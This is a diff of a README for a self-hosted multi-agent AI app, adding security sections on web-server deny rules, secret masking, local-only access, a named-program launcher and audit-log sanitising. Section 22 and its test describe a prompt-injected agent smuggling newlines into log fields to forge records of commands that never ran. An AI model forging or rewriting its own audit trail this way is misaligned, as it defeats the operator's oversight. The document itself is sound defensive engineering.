+| 🧮 Resource Manager | **all off** | the graph renders exactly as before |
+
+### 🧯 15. Fails closed, and tells the truth
+- **🧱 Fail closed** — when in doubt, refuse. A refused path reads as *"outside the allowed directories"*, never a blank `500`.
+- **🧹 Error hygiene** — failures come back as `{"error": "..."}` with HTTP `400` and a message **meant for the model**, and `display_errors` stays off so stack traces and filesystem paths never leak to a browser.
+- **🔍 Observability for you** — a live **Run trace** and an MCP audit log mean every model turn and tool call is inspectable after the fact.
+
+### 🗄️ 16. `storage/` is never web-served — in **every** serving mode
+
+- **🔑 What it holds.** The access token, every provider API key, the state
+  bundle, **every session transcript**, and the **exec allow/deny lists** that
+  decide which shell commands an agent may run. It is the most sensitive folder
+  in the app, and the one-folder design puts it *inside* the web root — so the
+  refusal has to be part of the app, not a step you remember. 🧠
+- **🧭 Same policy everywhere.** `storage/` is not special-cased: `storage`, `logs`,
+  `tmp`, `sessions` and `tests` are refused as **path segments**, in **all four**
+  serving modes, and the dev tooling is treated exactly like the secrets.
+
+| What is requested | 🧪 `serve.php` | 🟡 Apache | 🔴 nginx | 🔵 IIS |
+| --- | --- | --- | --- | --- |
+| `storage/config.json`, `state.json`, sessions | **403** | **403** | **404** | **404** |
+| `tests/php/…`, `tests/js/…` | **403** | **403** | **404** | **404** |
+| The bare folders (`/storage`, `/tests/`) — no listing either | **403** | **403** | **404** | **404** |
+| **Any depth**: `<copy>/storage/config.json`, `<copy>/tests/…` | **403** | **403** | **404** | **404** |
+| `…/STORAGE/state.json` (case variant) | **403** | **403** | **404** | **404** |
+| Dotfiles at **any depth** (`.git/…`, `.htaccess`, `.env`, `.htpasswd`) | **403** | **403** | **404** | deny ¹ |
+| Loose `.json` `.log` `.ini` `.bak` `.key` `.pem` outside `storage/` | served ² | served ² | **404** | served ² |
+| `/api`, `/api/sessions`, `/api/config` | **served** | **served** | **served** | **served** |
+| `ui/js/storage.js`, `ui/js/tools.js`, `/testsuite/` | **served** | **served** | **served** | **served** |
+
+<sub>¹ IIS has no `.htaccess` equivalent: its refusal has to come from a `web.config` you add (the snippet is under *Quick start → Deploying*), the way nginx's comes from `nginx.example.conf`. Apache's own `.ht*` default is **not** a substitute — it covers `.htaccess` and `.htpasswd` and serves `.git/config` quite happily — which is why the root `.htaccess` carries the same dot rule as the other two modes. ² These only exist if something wrote them there — `storage/` never is.</sub>
+
+- **🪆 Why “any depth” matters.** A second copy of the app — a backup, an
+  archive of an older version, a folder kept for comparison — brings its **own**
+  `storage/` with the same token and keys in it, and its `tests/` may predate
+  `tests/.htaccess`. A root-only check served all of that. The guard is therefore a
+  **segment** rule, not a prefix rule: anything named `storage` anywhere in the path
+  is refused, which is why `https://host/router/old-copy/storage/config.json`
+  answers `403` instead of a token.
+- **🗂️ The checkout sits in the web root, so `.git/` is part of the surface.**
+  This folder is the repository *and* the thing being served, which puts `.git/`
+  behind the same door as everything else: `.git/config` can carry a remote URL
+  with a token in it, and `.git/objects` reconstructs **every file ever
+  committed** — including one removed later for holding a secret. `serve.php` and
+  `nginx.example.conf` always refused dotfiles; Apache did not, and served
+  `.git/config` with the real `[core]` section as a **200**. The root
+  `.htaccess` now refuses any path segment starting with a dot, at any depth,
+  with `/.well-known` as the single exception so ACME renewal still works — and
+  `apacheGuards.test.php` requests `.git/config`, `.git/HEAD`, `.git/objects/pack/`
+  and a nested `.git` so it cannot quietly reopen.
+- **🧠 Why Apache needs `RedirectMatch`, not just a `RewriteRule`.** In
+  per-directory context a child `.htaccess` **replaces** its parent's rewrite rules
+  unless it opts into `RewriteOptions Inherit` — and every copy of this app ships
+  its own root `.htaccess`, so a rewrite in the outer app never sees
+  `<copy>/tests/…`. mod_alias configuration *is* merged down the tree, so the
+  shipped `RedirectMatch 403` holds no matter what a nested folder declares. (Found
+  with an Apache `rewrite:trace3` log: once the request maps into the copy, the
+  parent's rules are skipped entirely.)
+- **🚫 API routes are exempt — deliberately.** They are **endpoints, not files**.
+  The sidebar asks for `/api/sessions` to list sessions; a rule that matched the
+  word refused that call and broke the UI. No API route maps onto a path on disk —
+  the handlers open `storage/` themselves, server-side.
+- **🎯 Segment-anchored, not substring.** `ui/js/storage.js`, `ui/js/tools.js` and `/testsuite/` are still served: only a folder actually named `tests` is refused.
+- **🔠 Case-insensitive on purpose.** Windows and macOS disks resolve
+  `/STORAGE/state.json` to the real file, so a case-sensitive check was not a
+  check at all — `serve.php` lower-cases every segment, Apache uses `NC` / `(?i)`,
+  and nginx uses `~*`.
+- **🧾 No source either.** `serve.php` refuses any `.php` request except the API
+  front controller, so a mistyped path can't print PHP source as text; nginx is
+  told to deny dotfiles and loose data files (`.json`, `.log`, `.ini`, `.bak`,
+  `.key`, `.pem`) even outside `storage/`.
+- **🟡 Apache files that ship and self-repair.** `storage/.htaccess` refuses its
+  whole folder with `Require all denied` (plus an Apache 2.2 `Order/Deny` fallback,
+  so an old host gets a clean `403` rather than a `500`), `tests/.htaccess` does
+  the same for the dev tooling, and `./setup-token.sh` **re-creates the storage one
+  if a deploy lost it**.
+- **🚨 Verify, don't trust.** After deploying, ask for both — in a private window:
+  ```bash
+  curl -s -o /dev/null -w '%{http_code}\n' https://your-host/router/storage/config.json   # want 403 / 404
+  curl -s -o /dev/null -w '%{http_code}\n' https://your-host/router/tests/js/run.mjs       # want 403 / 404
+  curl -s -o /dev/null -w '%{http_code}\n' https://your-host/router/api/sessions           # want 401, never 403
+  ```
+  JSON or source in the first two means the folder is exposed — stop and fix the
+  rule before anything else. 🛑
+- **🏰 The strongest option:** keep `storage/` **outside** the document root. If
+  the one-folder design forces it inside, the deny rules above are mandatory, not
+  optional.
+
+### 🧪 17. The guards are proven, not assumed
+
+A guard nobody requests is a guard you don't have, so each serving mode has a test
+that **makes the real request** and fails loudly when a path comes back:
+
+| Test | What it actually does |
+| --- | --- |
+| 🧪 `guards.test.php` | Boots `serve.php` on a loopback port and requests the live paths — files, bare folders, case variants, dotfiles, the `/api/*` exemption and lookalike names |
+| 🟡 `apacheGuards.test.php` | Boots the local Apache with this folder as `DocumentRoot` and `AllowOverride All`, so the **shipped `.htaccess` files themselves** are what answer — `/tests`, `/storage`, the archived copy, and the dotfile rule over `.git/config`, `.git/HEAD`, `.git/objects/` and a nested `.git` |
+| 🔴 `nginxGuards.test.php` | Lifts the `location` regexes out of `nginx.example.conf` and runs them through PCRE — the engine nginx matches with — so a rule that reopens a hole fails without nginx installed |
+| 🪆 nested-copy checks | `guards.test.php` requests nested paths directly; `apacheGuards.test.php` does the same against the archived copy when one is present — the case a root-anchored rule misses |
+
+Run them with the rest of the suite (*Tests*, below). 🌱
+
+### 🌐 18. Closed by default in the browser, too
+
+- 🚫 **No CORS wildcard — deliberately.** The API used to answer with
+  `Access-Control-Allow-Origin: *`, which let **any** website on the internet
+  `fetch()` this server and read the answers: every conversation, the memory and
+  the whole config. The UI is served from this same origin and never needed it.
+  Cross-origin is now refused unless the origin is explicitly listed in
+  `ROUTER_CORS_ORIGINS` (comma-separated), and `Vary: Origin` keeps caches honest.
+- 🛡️ **Security headers on every Apache response** — `X-Content-Type-Options:
+  nosniff` (a `.js` can’t be talked into being a script of another type),
+  `X-Frame-Options: DENY` (the console can’t be framed inside another site, so no
+  clickjacking a SAVE button) and `X-XSS-Protection: 1; mode=block`. The built-in
+  server adds `nosniff` to everything it serves, SPA fallback included.
+- 🧊 **Cache policy is part of the contract** — HTML is `no-store`; JS and CSS are
+  `no-cache, must-revalidate`, so a browser can never pair a new module with a
+  month-old one (which is how an old `api.js` once ran beside a new `tools.js`).
+  The UI you audited is the UI that loads. ✅
+- 🔑 **The token never rides along** — it is stripped from every state bundle
+  before that bundle is mirrored to the server or synced to another device (§1).
+- 🙈 **What a *read* hands back is masked, and a copy with no token answers this machine only.** Both are
+  measures in their own right, with their own accounts below: **[§20 🔐 masked reads](#-20-secrets--masked-going-out-restored-coming-back)**
+  and **[§21 🏠 local-only](#-21-no-token-set--this-machine-only)**.
+
+> ⚖️ **The honest caveat:** the app is only as safe as the operator's switches. Turn
+> everything on, auto-approve writes, and point the root at `/` — and you have built
+> yourself a very capable foot-gun. The design *makes the safe choice the default*
+> and *makes the unsafe choice deliberate*, but it does not (and cannot) read your
+> mind. Keep the root narrow, keep approvals on, and rotate your keys. 💙
+
+### 🖥️ 19. Opening programs — a name, never a command line
+
+An agent can open a **real desktop program** on the machine this app runs on (**Config → Permissions →
+Shell access → Programs**). It could not do this usefully before: through `exec` a window was force-closed at the command
+timeout while the whole turn waited on it.
+
+- 🏷️ **The operator's list is the whole allowlist.** An agent may only **name** a program from
+  `sandbox.programs`; the path and the arguments come from that config. No string a model writes ever
+  reaches the OS launcher, so its quoting, `&`, `;` and `%` have nowhere to land — the same reason `exec`
+  takes argv instead of a command line.
+- 🪟 **Detached, so the window outlives the reply** — `cmd /c start` on Windows (the mechanism the built-in
+  browser already opens Chrome/Edge with), a backgrounded process on POSIX. There is no timeout here to
+  close what you asked to open.
+- 🧾 **Audited as a start with no end.** A launch writes one `kind=program phase=start` line and no end
+  line, which is what **Config → TRACE → EXEC** reads back as *started, never finished* — the case that
+  format exists for.
+- 🚫 **`.bat`, `.cmd` and `.ps1` are refused** as launch targets, because starting one means handing back the
+  command shell or script host this whole design keeps away from a model. That refusal is by extension and
+  is deliberately not overridable from the list; `exec_interpreters` is the door for script files, where the
+  script is jailed to the allowed directories and inline code is still refused.
+- 🙋 **Approval is the approval you already have** — *Ask / Allow / Deny* for **Opening programs** and
+  **Closing programs**, plus Auto Approve, Auto Deny and the usual prompt.
+- 🎯 **A close finds the *binary*, never the name.** Processes are matched by the file they are running from
+  (`/proc/<pid>/exe` on Linux, one `Get-CimInstance Win32_Process` query on Windows, `ps` elsewhere) and
+  compared as resolved paths. The older `tasklist` image-name filter made any other copy of that file on the
+  machine into *"the same program"*, so a close could end something you never opened — a vendor's
+  `helper.exe`, a second editor. If a host will not give up a process list, `close` **refuses** rather than
+  falling back to the name.
+- 🚪 **Closing is graceful first** (`taskkill /PID` posts WM_CLOSE; POSIX sends TERM), so a program can still
+  ask about unsaved work; `force` ends the process outright. The reply names the pids it ended, and every one
+  that refused with the reason (`access denied`, `already exited`) — `ok` means the program is gone, not that
+  a signal was sent. A console program with no window has nothing to receive a close request, so it needs
+  force.
+- ⌨️ **Typing is a tool too — `window_type`, and it is really typing.** An agent with an open window can send
+  keystrokes into it, live on screen: `window_open` Notepad, `window_type` the words, watch them appear. The
+  program must already be running (typing into nothing throws instead of pretending), the window is brought
+  forward and the keys sent in one motion, and each call carries at most 2000 characters — a long letter goes
+  in several bursts, which is also what it looks like. Special keys arrive literally (`+`, `%` and friends are
+  escaped, newlines become ENTER), the keystrokes are *never* written to the trace (it records that typing
+  happened, not what was typed), and approval is its own switch — **Typing into programs** beside Opening and
+  Closing. Windows only: it is the system's own keystroke injector, and POSIX has no single equivalent, so
+  anywhere else refuses plainly. And the old rule still holds — the operator names the program, the model only
+  supplies the keys.
+- 📦 **A Store copy is still the same program.** On Windows 11 a program like Notepad *runs* from a
+  WindowsApps path nobody configured, while the list holds the alias stub that launched it — so the match
+  crosses that one boundary by file name, and only there, because neither side is a place a second copy
+  could be hiding. `window_type` also waits a few seconds for a just-opened program to show up before
+  concluding nothing is running, and checks the window really came forward before sending — a stolen focus
+  fails loudly instead of typing into the wrong place.
+- 🧾 **The trace is written by this app alone** — every field is stripped of control characters before it
+  reaches `storage/exec.log`, so an argument carrying a newline cannot append a record of a command that
+  never ran. Full account in **[§22](#-22-the-trace-is-written-by-this-app-alone)**.
+- ⚠️ **Where the window appears matters.** A program opens in the session Apache runs in: started as a
+  console process (`start.bat`) it appears on your desktop, but installed as a Windows **service** it lands
+  in session 0 and nothing is ever visible. On POSIX it needs a desktop session — a headless host has nowhere
+  to draw. The card states which of these is true on this host, so nobody guesses.
+- 🔒 **Off by default** (`sandbox.programs_enabled`, empty list): updating an older install gains the tools
+  and no capability at all until you add a program.
+
+### 🔐 20. Secrets — masked going out, restored coming back
+
+Three routes were handing back the very values they exist to protect. 🚨 It is worth being precise about why
+that is worse than it sounds, because it is not "a leak of one secret" — **it is the same secret that guards
+the other doors.**
+
+- 🎯 **What came back, verbatim** — `GET /api/config` returned the **access token**, a **proxy URL with its
+  password in it**, and every **provider API key**; `GET /api/mcp/servers` returned each MCP client's
+  `headers` (the `Authorization: Bearer …`, and any other key header); `GET /api/mcp-server/config` returned
+  every **friend's token**. The access token is what the front gate compares against, and a friend token is
+  what `McpServer::authenticate()` compares against — so one read disclosed the keys to every gated route.
+  🗝️➡️🚪
+- 🙈 **What comes back now: `********`.** A single constant (`Config::SECRET_MASK`) and two functions —
+  `Config::maskSecrets()` on the way out, `Config::restoreSecrets()` on the way in — so the mask is spelled
+  once and cannot drift between routes. Masked: the access token, `sandbox.proxy_active` **when it carries
+  credentials**, every value in an MCP client's `headers`, the MCP server's tokens, and its protected-paths
+  entries that hold secrets. ✂️
+- 🕳️ **Empty stays empty — the difference matters.** *"No token configured"* and *"a token you are not
+  allowed to see"* are two different states, and the UI has to tell them apart: a fresh install must show an
+  empty field (and the *run `setup-token.sh`* hint), not eight asterisks. So masking is applied **only to
+  values that are actually set**. 🫥 A proxy with **no** username and password is not a secret either — it is
+  a setting, and the panel still names the exit node you are routing through. 🌐
+- ♻️ **Why masking cannot simply mean "never send it":** every panel in this app edits by **read → change
+  one key → post the whole config back**. Hand a page a config with a blanked token and the very next toggle
+  writes the blank back to disk — a wiped credential that shows up later as a server answering `401`, with
+  nothing in the logs to say why. So the read masks and the **write restores.** 🔁
+- 🧬 **Restore matches by *identity*, not by position.** An array index is not a name: reordering two MCP
+  servers, or deleting one and adding another, would have put a stranger's header onto the wrong server (a
+  live credential pointed at an endpoint you never configured). Matching is therefore: a **server by its
+  `id`, then by its URL, then by its command line**; a **friend token by its id, then by its label**. Rename a
+  server in the panel and its `Authorization` header still comes back — that is a test, not a hope. 🪪
+- 🚮 **A mask with nothing behind it is dropped, and said so.** Add a brand-new server, leave the header box
+  showing `********`, and there is no stored value to put back — so the header is **not written at all**
+  rather than being saved as the literal asterisks, which would have been a credential that authenticates as
+  nothing and looks like the far end's fault. The count is reported back on the save. 🧾
+- ✍️ **A real value typed over the mask wins.** Paste a new key into that box and it is stored as typed —
+  masking only ever stands in for "unchanged". 🔑
+- 👁️ **A friend's token is visible exactly once** — when it is created, or when **ROTATE** is pressed: the
+  server keeps it, and a later read answers the mask. The **COPY** button refuses to hand over a mask for the
+  same reason the drop above exists: pasting `********` into a client authenticates as a wrong token, and the
+  failure reads as the *server's* problem rather than as a copy that copied nothing. 📋🚫
+- 🧪 **Proven, not assumed** — `tests/php/secrets.test.php` asserts the mask on every field, that empty stays
+  empty, that a credential-free proxy stays readable, a **clean round-trip restores every secret**, a renamed
+  server keeps its header (URL match), an unresolvable mask is **dropped and counted**, and a typed value
+  beats the mask. ✅
+
+### 🏠 21. No token set — this machine only
+
+`./setup-token.sh --off` prints that it is fine on *"a machine nothing else can reach"* — and until v360
+nothing enforced it. On a copy behind a web server bound to all interfaces, that was not a theoretical gap:
+**`POST /api/sandbox/program` is a program launcher an agent can reach**, `POST /api/sandbox/exec` runs
+commands, and `GET /api/config` — the route from §20 — **answered with the very token that guards the routes
+which *were* protected.** 🚪🔓
+
+- 🧭 **Now the documented posture is the enforced posture.** With `require_token` off, a request whose peer
+  address is **not loopback** gets **`403 {"error":"local requests only"}`**, plus the one-liner that fixes it:
+  `./setup-token.sh` (or `start.bat -Token` on Windows), then paste the token into **Config → Access token**
+  on each device — after which the copy is reachable from anywhere again, which is what a token is for. 🔑
+- 🔁 **Three spellings of "this machine"** count as local: `127.0.0.1`, `::1`, and the IPv4-mapped
+  `::ffff:127.0.0.1` that some Windows stacks report. All three are asserted in the suite, along with a LAN
+  address, another private address and a public one — none of which are local. 🧪
+- 🕳️ **No peer address at all passes** (the CLI, and PHP's built-in server before it has bound). There is no
+  network path there to refuse — and refusing it would only break the tooling that runs on the same machine. 🖥️
+- 🎭 **The `Host` header is deliberately not consulted.** It is client-supplied, so a rule like "the Host
+  matched the peer address" would let anyone in by naming **their own** address in the request. The decision
+  is made on the **socket**, not on anything the caller wrote. 🚫
+- 🤝 **The MCP RPC route is exempt, on purpose.** `POST /api/mcp-server` exists for other machines and keeps
+  its own **per-friend Bearer token** with a **read / write / exec** scope ceiling, an optional IP allowlist
+  and one-click revoke (§12). It is the one door this rule must leave open — and it is a *door*, not a hole:
+  the caller is authenticated before anything runs. 🔐
+- ⚖️ **The honest edge:** a request arriving through a **reverse proxy on the same host** has the proxy as
+  its peer, so it looks local and passes. That is the operator's own configuration rather than a stranger's
+  path (§4, *the jail*), and the answer is the same as everywhere else in this app: **set a token** and the
+  question stops mattering. 🧱
+
+### 🧾 22. The trace is written by this app alone
+
+`storage/exec.log` is the audit trail — the two-phase `run=… phase=start|end` record that **Config → TRACE →
+EXEC** reads back, that pairs a command's start with its end, and that shows an opened window as *started and
+still running*. 🧾 Its authority depends on one property: **one line per record.** 📏
+
+- 🪤 **So a newline is a forgery.** Free text reaches these fields — the **agent name** arrives in the tool
+  call, and every **argv element** is whatever a model sent. A `\n` in either one would let a prompt-injected
+  agent **append a hand-written line** describing a command that never ran (or, worse, make a real one look
+  like part of a different record) — the audit trail quietly rewritten by the thing it is auditing. 🎭
+- 🛡️ **Stripped at the one chokepoint, not at the callers.** Sanitising lives **inside `Sandbox::audit()`**,
+  which `exec`, `run_code`, `window_open` and `window_close` all pass through — so a future caller cannot
+  forget it, and it runs **before** the shell-quoting decision below, so a quote-escaped argument cannot carry
+  a line break through the escaping. 🚧
+- 🧬 **Two shapes, because the line carries two kinds of field.** The fields the reader takes as a **single
+  token** (`run`, `phase`, `kind`, `agent`) lose everything from the first break onward and any character
+  outside `[\w.:@-]` — a space there would split the field and make the whole line unparseable, which would
+  lose a **real** record while stopping a forged one. Free text (`cwd`, the program, the argv) turns breaks
+  into a space and is capped (240 characters per field, 12 argv elements), so one enormous argument cannot
+  bloat the log either. ✂️ An empty token becomes `-`, because an empty field breaks the reader's pattern. 🩹
+- 👀 **The reader still shows the interesting failure.** Start and end lines are paired by their `run` id, and
+  a start with no end comes back as `finished: false` — *started, never finished* is exactly the row you want
+  to see after a crash or a kill mid-command, so it is surfaced rather than hidden. 🔍
+- 🧪 **Proven** — `tests/php/programs.test.php` §5d writes an audit entry whose agent name contains a newline
+  and a complete fake record (`run=forged-inject phase=start …`), then asserts the real run is still recorded
+  in one piece **and that the forged run id never becomes an entry of its own**. ✅
+
+### 🧪 23. The test suite cannot touch the trace — or another file's server
+
+`tests/` is dev tooling the app never loads, and it now runs **four files at a time**. That is only safe because
+the two things those files used to share were taken away first — and both of them were **state this app's own
+security rests on**. 🧪
+
+- 🧾 **The audit trail is not a scratch file.** `storage/exec.log` is the two-phase record covered in **§22**: the
+  answer to *"did anything actually run?"*. Two test files wrote it, and each remembered its size on entry and
+  **truncated it back on the way out** — tidy when you are the only writer, and a **deletion of another file's
+  lines** the moment you are not, which is exactly what running them at the same time makes them. A test run could
+  be mistaken for real commands, and a real command's record could vanish under one. The trace a test writes now
+  goes to a directory of that file's own: `Sandbox::logDir()` honours `ROUTER_LOG_DIR`, the runner sets it per
+  file, and `storage/mcp.log` (**§12**) goes the same way. Running the whole suite leaves the operator's
+  `exec.log` and `mcp.log` **byte-identical** — measured, not hoped. 🛡️
+- 🔒 **The redirect cannot be reached from outside.** `ROUTER_LOG_DIR` is read from the **process environment**.
+  There is no route, header, query string or config field that sets it, so no request and no model can move, hide
+  or read a log by asking for it, and unset — the normal state — keeps `storage/` exactly as it was. Its only
+  reachable effect is to add a directory that a test writes to. 🚫
+- 🌐 **Loopback only, and a port of its own.** Every server the suite starts binds **`127.0.0.1`** and never
+  `0.0.0.0` — the generated Apache config is literally `Listen 127.0.0.1:<port>` — and the port is now a walk
+  from `21000 + pid % 4000`, which stays **below the OS's ephemeral range**. The old way asked the OS for "any
+  free port" (`tcp://127.0.0.1:0`), which is a race the moment two files ask at the same moment: the number
+  returns to the pool as the socket closes, so both can be handed the same one and one file ends up **talking to
+  the other file's server** — assertions answered by a server it never started. A port a real service is *using*
+  is no longer a candidate either, which matters because a bind failure there looks exactly like a broken build. 🧭
+- 🙋 **Separate processes, for the same reason as ever.** The suite separates its files so one cannot colour
+  another's result (**§17**). A file that can reach into another file's socket or log can report green for
+  something it never checked, so "each file is its own process" has to stay true down to the port it binds and
+  the file it writes. ✅
+- 🧪 **Proven** — six consecutive four-wide runs plus `--jobs 8` and `--jobs 2`, all green with identical counts;
+  sampling `netstat` during a run caught **seven simultaneous listeners, all inside the pid-derived band and none
+  of them repeated**; run by itself with `ROUTER_LOG_DIR` set, `sandbox.test.php` writes its 9 audit lines into
+  that directory while the install's `exec.log` is unchanged; and a full fresh-copy check — `PHP 20 files, 20 passed, 1,129 assertions, 5 skipped` and `JS 24 files, 24 passed, 681 assertions` — costs about 38s end to end. 🔬
+
+> 🧷 **One rule underneath all of this:** nothing that a model can *write* ever becomes a decision the app
+> obeys. A name, not a path; argv, not a command line; a mask, not a credential; the peer address, not the
+> `Host` header; one token, not two records. That is the whole design, repeated in five different places. 💙
+
+---
 ## 🖥️ Two interfaces, one switch
 
 Both shells are the same application: one store, one set of components, one feature list. `settings.interfaceMode` decides which decoration is worn, and it applies the moment you pick it in **Config → Interface** — no reload, no second install, and **no feature that exists in only one of them**.
@@ -194,6 +806,13 @@ Both shells are the same application: one store, one set of components, one feat
   |    SETUP     |    CHAT     |      MAP      |
   +--------------+-------------+---------------+
 ```
+
+> 🗂️ **Config, tidied.** The Config tab is split into collapsible sections —
+> **Interface · Limits & Budgets · Permissions · Labs · Resource Manager ·
+> Throttle / Limiter · MCP Client · MCP Server**, with **Desktop** appended as its
+> own card (see *Config → Desktop* above) — each carrying a live status badge on
+> its header. It also **rescues numbers you typed but haven't Saved yet**, so
+> switching tabs mid-edit never silently discards them.
 
 Two rules kept that honest:
 
@@ -263,166 +882,6 @@ One switch writes **the same nine settings the controls above already own** — 
 Saved settings always win: a fresh copy starts here, and an existing install keeps whatever you already chose until you move that control. 💾
 
 </details>
-
----
-## 🚀 Quick start
-
-### 🪟 Windows — one click
-- **`start.bat`** — the one-click launcher. First run installs XAMPP (Apache + PHP only, no MySQL), links this folder into `htdocs\router`, configures Apache, creates the access token, starts it and opens the app. Later runs just start Apache. Use this when several agents run at once: Apache is multi-threaded.
-- **`start-php.bat`** — legacy built-in server (single-threaded). Fine for one agent at a time, or on machines where Apache cannot run.
-- **`setup-xampp.bat`** — repair / advanced installer, used by `start.bat` automatically. Run it directly to reinstall XAMPP or pick another port (`setup-xampp.bat -Port 8090`).
-
- 🧵**Autonomous' implementation of Apache / PHP is not single-threaded — and that is exactly the point.**
- Apache serves many requests at once (a pool of worker processes and threads), so a
- whole team of agents really does run in parallel. 
- **Autonomous ships the workaround!:** with **one click** installs XAMPP
- (Apache + PHP only), points it at a free port, loads the `mod_*` modules the
- app's `.htaccess` needs, links the folder and starts a genuinely concurrent
- server — **zero configuration, no database, nothing to hand-tune**. That is the
- mold this project breaks: a multithreaded local server, deployed in one click.
- (`start-php.bat` remains for the rare machine where Apache cannot run; it is the
- slow single-threaded fallback.)
-> * *PHP's own built-in server is the opposite: `php -S` is a single process,
-> so one streamed model reply holds the only slot for its entire duration while
-> every other agent — and the browser's own state polling — queues behind it until
-> the fetch dies with `NetworkError`. Windows PHP cannot fork, and the usual
-> local Windows PHP setups
-> either accept that limit or expect you to install and hand-edit Apache/FPM
-> yourself. * *
-
-### 🐧 Linux / macOS
-```bash
-./start.sh          # or ./start.sh 8090 for another port
-```
-
-### 🌍 Deploying on a real web host (Apache / nginx / IIS)
-
-The one-folder design means `storage/` (the token, provider keys, every session
-and the exec allow/deny lists) lives **inside the app folder**. That folder must
-**never** be reachable over HTTP. Everything here is about keeping it that way. 🔒
-
-The same rules also cover `tests/`: dev tooling that never runs at runtime, but
-that nobody else needs to read either. The full grid — every path against every
-serving mode, dotfiles and case variants included — is in
-**Security & guardrails → §16**, and the rules are **tested by making the real
-request** (§17). 🧪
-
-- 🟡 **Apache** — `storage/.htaccess` and `tests/.htaccess` ship with the app and
-  deny their whole folder (`Require all denied`, with a 2.2 fallback).
-  `./setup-token.sh` **re-creates the storage one if a deploy lost it**. Just make
-  sure `AllowOverride` lets `.htaccess` apply (the XAMPP installer sets this for
-  you). The app root `.htaccess` also refuses `storage`, `logs`, `tmp`, `sessions`
-  and `tests` as a path segment **at any depth** — a backup or archived copy of the
-  app kept inside the web root brings its own `storage/` and `tests/`, and a copy
-  made before `tests/.htaccess` existed would otherwise serve its test files in
-  full. That guard is `RedirectMatch 403` (mod_alias), not a `RewriteRule`: a child
-  `.htaccess` replaces its parent's per-directory rewrites, so a rewrite never sees
-  the nested path, while mod_alias config merges normally.
-- 🔴 **nginx** — **ignores `.htaccess` entirely**, so you *must* add the rules
-  yourself. Ship the included **`nginx.example.conf`** into your `server{}` block
-  (it denies `storage`, `logs`, `tmp`, `sessions` and `tests` as a path segment **at
-  any depth** — so a backup or an archived copy of the app kept inside the web root
-  cannot expose its own `config.json` — plus dotfiles and loose
-  `.json/.log/.ini/.bak/.key/.pem` files), then `nginx -t && systemctl reload nginx`.
-  A file whose *name* merely contains one of those words (`ui/js/storage.js`, `ui/js/tests.js`)
-  is still served.
-- 🔵 **IIS** — add a `web.config` at the app root that blocks the `storage` and
-  `tests` segments, e.g.:
-  ```xml
-  <configuration><system.webServer><security><requestFiltering>
-    <hiddenSegments>
-      <add segment="storage" /><add segment="logs" /><add segment="tmp" />
-      <add segment="sessions" /><add segment="tests" />
-    </hiddenSegments>
-  </requestFiltering></security></system.webServer></configuration>
-  ```
-- 🧪 **The PHP built-in server** (`start-php.bat` / `php serve.php`) already
-  refuses `/storage`, `/logs`, `/tmp`, `/sessions`, `/tests` and dotfiles with a
-  `403` — no config needed.
-- ✅ **Verify it, don't assume it.** After any deploy, fetch
-  `https://your-host/router/storage/config.json` **and**
-  `https://your-host/router/tests/js/run.mjs` in a private window. You must get
-  **403 / 404** for both — never JSON or source. If you do, stop and fix the rule
-  above before doing anything else. 🚨
-
-### 🔑 First run
-The launchers install PHP + the extensions it needs (curl, openssl, mbstring, fileinfo, zip) without touching your own `php.ini`, bundle CA certs so HTTPS verifies, and print an **access token** once. Paste it into **Config → Access token** in the app — it saves on paste (there's no SAVE for that field, on purpose).
-
-On Windows the app opens at `http://localhost:8080/router/` (Apache); on Linux/macOS it opens at `http://127.0.0.1:8080/`. If you miss the token, run `start.bat -Token` to print it again. Nothing ships with keys — add your own providers in the **Providers** tab.
-
----
-
-## 🧠 Brain Lab
-
-![Brain Lab](screenshots/Brain-Lab.png)
-
-One rail for everything about the selected agent:
-
-<details>
-<summary>The full rail, locks, and the Config tidy-up</summary>
-
-- **Identity** — name, label, role, provider, model, colour, active.
-- **Prompts & Profiles** — the agent's system prompt, an always-append box, and reusable **direction profiles** you can attach and lock. (A fleet-wide override lives in the Agents-tab header — see *Global pre-prompt override*.)
-- **Direction profiles** — reusable, lockable instructions you can **attach** and **append** to any agent, so a house style is defined once and shared.
-- **Rate / Throttle** — per-agent pacing.
-- **Approvals & Tools** — per-tool **allow / ask / deny**, plus a tool protocol picker that shows the **auto-detected** dialect.
-- **Custom tools** — define your own, straight from the rail.
-- **Sandbox** — a per-agent **file jail** and the file manager.
-- **Memory** — private and collective notes, a Long-term-memory switch, and delete buttons (forgetting is a first-class action).
-- **Always-On** — a standing goal, loop cadence, and a live RUNNING/HELD/IDLE badge. (Full walk-through in *Always-On — the loop that runs itself* below.)
-
-Every setting has a 🔒 **lock**: unlocked agents follow the global value live; a lock pins the agent to its own value so a global change never moves it. 🔏
-
-> 🗂️ **Config, tidied.** The Config tab is split into collapsible sections —
-> **Interface · Limits & Budgets · Permissions · Labs · Resource Manager ·
-> Throttle / Limiter · MCP Client · MCP Server**, with **Desktop** appended as its
-> own card (see *Config → Desktop* above) — each carrying a live status badge on
-> its header. It also **rescues numbers you typed but haven't Saved yet**, so
-> switching tabs mid-edit never silently discards them.
-
-> 🖥️ **Two interfaces, one switch.** **Interface** (the first control in Config)
-> picks the shell — **Classic** by default, **Desktop 2026** on request. Both are
-> the same app, the same features and the same store; the full comparison and the
-> screenshots live in *Two interfaces, one switch* above. 🔁
-
-</details>
-
----
-## 🧪 API Lab
-
-![API Lab](screenshots/API-Lab.png)
-
-Opened from the 🧪 icon in the Agents-tab header.
-
-<details>
-<summary>Both directions, server-side sending and guardrails</summary>
-
-- **Both directions**: `curl → request → 10 languages`, and `language → request → curl/bash/Python/TypeScript/OpenAI-SDK`.
-- **Sending is server-side**, because the browser can't reach most providers (no CORS headers). The server runs the request and returns the status + body.
-- **Guardrails**: http/https only; cloud-metadata addresses refused; key-shaped headers masked on screen (copy/send still use the real value); response bodies truncated.
-
-</details>
-
----
-## 🔀 Routing chart
-
-Draw the flow instead of describing it.
-
-**Nodes** — agent, parallel, merge, checkpoint, delay, loop, end.
-
-![Routing chart — three workflows with loops and fan-out](screenshots/routing-three-workfows.png)
-
-**Loops** carry per-lap state, and **parallel fan-out** runs every ready node concurrently — the scheduler handles it.
-
-![A loop feeding a parallel group](screenshots/routeing-loop.png)
-
-**Checkpoints** pause the run for review before it continues downstream.
-
-![A checkpoint waiting for review](screenshots/checkpoint.png)
-
-**Delays** wait a duration or until a wall-clock time, and hold only their own branch.
-
-**Live run state** shows on the edges (marching + glow while running, settle when done), with a faint **ghost transcript** of the chat behind the canvas and an **align-to-grid** snap (off by default). A **notification bell** lists run errors/warnings.
 
 ---
 
@@ -662,7 +1121,7 @@ It stacks with the pacer: every key is counted in its **own** bucket 📈, so a 
 
